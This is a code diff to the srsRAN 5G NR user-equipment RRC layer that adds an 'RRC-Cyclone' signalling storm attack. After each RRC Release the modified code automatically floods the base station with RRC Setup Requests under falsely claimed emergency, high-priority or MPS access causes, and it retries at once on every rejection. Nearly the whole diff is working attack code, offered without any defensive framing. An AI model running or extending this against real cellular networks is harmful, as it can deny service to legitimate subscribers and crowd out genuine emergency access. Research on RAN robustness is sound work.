@@ -29,6 +29,7 @@
 #include "srsue/hdr/stack/upper/usim.h"
 #include <chrono>
 #include <random>
+#include <ctime>
 #include <thread>
 
 using namespace asn1::rrc_nr;
@@ -416,6 +417,12 @@ void rrc_nr::handle_sib1(const sib1_s& sib1)
 {
   if (meas_cells.serving_cell().has_sib1()) {
     logger.info("SIB1 already processed");
+    
+    // !vi - ATTACK MODE: Force trigger cell selection completion if attack is active
+    if (attack_mode_active && cell_selector.is_busy()) {
+      logger.info("[RRC_ATTACK_NR] SIB1 already processed, but forcing cell selection completion for attack");
+      cell_selector.trigger(true); // fix: rigger with sib1_found=true
+    }
     return;
   }
 
@@ -616,7 +623,7 @@ void rrc_nr::send_security_mode_complete()
 
 void rrc_nr::send_setup_request(srsran::nr_establishment_cause_t cause)
 {
-  logger.debug("Preparing RRC Setup Request");
+  logger.info("[RRC_ATTACK_NR] Preparing RRC Setup Request with cause %d", (int)cause);
 
   // Prepare SetupRequest packet
   ul_ccch_msg_s            ul_ccch_msg;
@@ -631,7 +638,12 @@ void rrc_nr::send_setup_request(srsran::nr_establishment_cause_t cause)
   rrc_setup_req->ue_id.random_value().from_number(random_id, rrc_setup_req->ue_id.random_value().length());
   rrc_setup_req->establishment_cause = (establishment_cause_opts::options)cause;
 
+  logger.info("[RRC_ATTACK_NR] Generated random UE ID: %lu", random_id);
+  logger.info("[RRC_ATTACK_NR] Sending RRC Setup Request to MAC layer");
+
   send_ul_ccch_msg(ul_ccch_msg);
+  
+  logger.info("[RRC_ATTACK_NR] RRC Setup Request sent successfully");
 }
 
 void rrc_nr::send_ul_ccch_msg(const asn1::rrc_nr::ul_ccch_msg_s& msg)
@@ -973,6 +985,9 @@ void rrc_nr::rrc_release()
   pdcp->reset();
   mac->reset();
   lcid_drb.clear();
+  
+  // Set state to IDLE after release
+  state = RRC_NR_STATE_IDLE;
 
   // Apply actions only applicable in SA mode
   if (rrc_eutra == nullptr) {
@@ -2284,6 +2299,61 @@ void rrc_nr::handle_rrc_release(const asn1::rrc_nr::rrc_release_s& msg)
   srsran::console("Received RRC Release\n");
 
   rrc_release();
+  
+  // !vi - AUTO-ATTACK: Automatically start signal storm attack after RRC release
+  logger.info("[RRC_ATTACK_NR] RRC Release detected. Starting automatic signal storm attack...");
+  srsran::console("[RRC_ATTACK_NR] Auto-starting signal storm attack after RRC release\n");
+  
+  // Check current state before starting attack
+  logger.info("[RRC_ATTACK_NR] Current state: %d, PLMN selected: %s", state, plmn_is_selected ? "true" : "false");
+  
+  // Enable attack mode and start the storm
+  attack_mode_active = true;
+  
+  // Generate new random identity for this attack session
+  random_gen = srsran_random_init(time(NULL));
+  
+  // Select random high-priority cause for initial request
+  std::random_device rd;
+  std::mt19937 gen(rd());
+  std::uniform_int_distribution<uint8_t> cause_dist(0, 2);
+  
+  srsran::nr_establishment_cause_t cause;
+  uint8_t cause_sel = cause_dist(gen);
+  if (cause_sel == 0) {
+      cause = srsran::nr_establishment_cause_t::emergency;
+  } else if (cause_sel == 1) {
+      cause = srsran::nr_establishment_cause_t::highPriorityAccess;
+  } else {
+      cause = srsran::nr_establishment_cause_t::mps_PriorityAccess;
+  }
+  
+  logger.info("[RRC_ATTACK_NR] Auto-launching connection request with cause %d", cause_sel);
+  
+  // Check if we can launch connection request
+  if (state != RRC_NR_STATE_IDLE) {
+      logger.warning("[RRC_ATTACK_NR] Cannot launch attack - not in IDLE state (current: %d)", state);
+      attack_mode_active = false;
+      return;
+  }
+  
+  if (!plmn_is_selected) {
+      logger.warning("[RRC_ATTACK_NR] Cannot launch attack - no PLMN selected");
+      attack_mode_active = false;
+      return;
+  }
+  
+  // Launch the initial connection request
+  int result = connection_request(cause, nullptr);
+  logger.info("[RRC_ATTACK_NR] connection_request() returned: %d", result);
+
+  if (result == SRSRAN_SUCCESS) {
+      // **DO NOT ADD THE PROCEDURE AGAIN HERE. IT IS ALREADY ADDED BY connection_request()**
+      logger.info("[RRC_ATTACK_NR] Auto-attack launched successfully. Attack mode active - will retry automatically on rejection.");
+  } else {
+      logger.error("[RRC_ATTACK_NR] Failed to launch auto-attack connection request (result: %d)", result);
+      attack_mode_active = false; // Disable attack mode on failure
+  }
 }
 
 // Security helper used by Security Mode Command and Mobility handling routines
@@ -2376,109 +2446,53 @@ void rrc_nr::set_phy_config_complete(bool status)
 
 void rrc_nr::start_rrc_cyclone()
 {
+    // !vi - RRC-Cyclone Attack implementation
     logger.info("[RRC_ATTACK_NR] ========== Starting Signal Storm Attack ==========");
+    srsran::console("[RRC_ATTACK_NR] Starting SIGNAL storm with immediate retry on rejection\n");
 
-    const int max_attacks = args.rrc_storming_max_attacks > 0 ? args.rrc_storming_max_attacks : 100000;
-    const int attack_interval_ms = args.rrc_storming_interval_ms > 0 ? args.rrc_storming_interval_ms : 1000;
-    const int reset_delay_ms = 20; 
-
-    logger.info("[RRC_ATTACK_NR] Max cycles: %d, Delay: %dms", max_attacks, attack_interval_ms);
-    srsran::console("[RRC_ATTACK_NR] Starting SIGNAL storm: %d cycles @ %dms intervals\n", max_attacks, attack_interval_ms);
-
+    // Enable attack mode - this will trigger immediate retry on any rejection
+    attack_mode_active = true;
+    
+    // Generate new random identity for this attack session
+    random_gen = srsran_random_init(time(NULL));
+    
+    // Select random high-priority cause for initial request
     std::random_device rd;
     std::mt19937 gen(rd());
-    std::uniform_int_distribution<uint8_t> cause_dist_selector(0, 2);
+    std::uniform_int_distribution<uint8_t> cause_dist(0, 2);
+    
+    srsran::nr_establishment_cause_t cause;
+    uint8_t cause_sel = cause_dist(gen);
+    if (cause_sel == 0) {
+        cause = srsran::nr_establishment_cause_t::emergency;
+    } else if (cause_sel == 1) {
+        cause = srsran::nr_establishment_cause_t::highPriorityAccess;
+    } else {
+        cause = srsran::nr_establishment_cause_t::mps_PriorityAccess;
+    }
+    
+    logger.info("[RRC_ATTACK_NR] Launching initial connection request with cause %d", cause_sel);
+    
+    // Launch the initial connection request
+    if (connection_request(cause, nullptr) == SRSRAN_SUCCESS) {
+        callback_list.add_proc(setup_req_proc);
+        logger.info("[RRC_ATTACK_NR] Initial connection request launched. Attack mode active - will retry automatically on rejection.");
+    } else {
+        logger.error("[RRC_ATTACK_NR] Failed to launch initial connection request");
+        attack_mode_active = false; // Disable attack mode on failure
+    }
+}
 
-    int cycle_count = 0;
-    int successful_requests_initiated = 0;
-
-    while (cycle_count < max_attacks && running)
-    {
-        try {
-            cycle_count++;
-            logger.info("[RRC_ATTACK_NR] ========== Cycle %d/%d ==========", cycle_count, max_attacks);
-
-            // Force Release/Reset & Stop Timers
-            logger.info("[RRC_ATTACK_NR] Forcing local stack reset...");
-            mac->reset();    
-            rrc_release(); 
-            state = RRC_NR_STATE_IDLE; 
-
-            if (t300.is_running()) t300.stop();
-            if (t301.is_running()) t301.stop();
-            if (t302.is_running()) t302.stop();
-            if (t304.is_running()) t304.stop();
-            if (t310.is_running()) t310.stop();
-            if (t311.is_running()) t311.stop();
-            logger.info("[RRC_ATTACK_NR] All RRC timers stopped.");
-            
-            // Force-Recreate the stuck Procedure Object
-            // self-note: this fixed the "setup_req_proc STILL busy" error
-            if (setup_req_proc.is_busy()) {
-                logger.info("[RRC_ATTACK_NR] setup_req_proc is busy. Forcefully recreating it...");
-                
-                // the destructor of the procedure
-                setup_req_proc.~proc_t<setup_request_proc>();
-                
-                // call the constructor again in the same memory location
-                new (&setup_req_proc) proc_t<setup_request_proc>(*this);
-                
-                logger.info("[RRC_ATTACK_NR] setup_req_proc has been called.");
-            }
-            
-            // force-recreate other procedures that might be stuck
-            if (cell_selector.is_busy()) {
-                 cell_selector.~proc_t<cell_selection_proc, rrc_cell_search_result_t>();
-                 new (&cell_selector) proc_t<cell_selection_proc, rrc_cell_search_result_t>(*this);
-            }
-            
-            // Wait for stabilization
-            logger.info("[RRC_ATTACK_NR] Waiting %dms for stack cleanup...", reset_delay_ms);
-            std::this_thread::sleep_for(std::chrono::milliseconds(reset_delay_ms));
-
-            // Step 4: Verify State & Trigger Connection Request
-            if (setup_req_proc.is_busy()) {
-                 logger.error("[RRC_ATTACK_NR] setup_req_proc is STILL busy after recreation! Skipping.");
-                 std::this_thread::sleep_for(std::chrono::milliseconds(attack_interval_ms));
-                 continue;
-            }
-            
-            logger.info("[RRC_ATTACK_NR] Procedure is idle. Proceeding with new request.");
-
-            // Trigger Connection Request
-            srsran::nr_establishment_cause_t cause;
-            const char* cause_str;
-            uint8_t sel = cause_dist_selector(gen);
-            
-            if (sel == 0) {
-                cause = srsran::nr_establishment_cause_t::emergency;
-                cause_str = "emergency";
-            } else if (sel == 1) {
-                cause = srsran::nr_establishment_cause_t::highPriorityAccess;
-                cause_str = "highPriorityAccess";
-            } else {
-                cause = srsran::nr_establishment_cause_t::mps_PriorityAccess;
-                cause_str = "mps_PriorityAccess";
-            }
-            
-            logger.info("[RRC_ATTACK_NR] Triggering RRC connection_request (cause: %s)", cause_str);
-
-            if (connection_request(cause, nullptr) != SRSRAN_SUCCESS) {
-                logger.error("[RRC_ATTACK_NR] Failed to initiate connection_request procedure.");
-            } else {
-                successful_requests_initiated++;
-            }
-
-            // Step 6: Wait for Next Cycle
-            std::this_thread::sleep_for(std::chrono::milliseconds(attack_interval_ms));
-
-        } catch (const std::exception& e) {
-            logger.error("[RRC_ATTACK_NR] Exception occurred during attack loop: %s", e.what());
-            break;
-        }
-    } 
-
-    logger.info("[RRC_ATTACK_NR] ========== Finished Storming ==========");
+void rrc_nr::stop_rrc_cyclone()
+{
+    // !vi - Stop the attack
+    logger.info("[RRC_ATTACK_NR] Stopping Signal Storm Attack");
+    srsran::console("[RRC_ATTACK_NR] Stopping SIGNAL storm attack\n");
+    
+    // Disable attack mode
+    attack_mode_active = false;
+    
+    logger.info("[RRC_ATTACK_NR] Attack mode disabled. No more automatic retries.");
 }
 
 } // namespace srsue
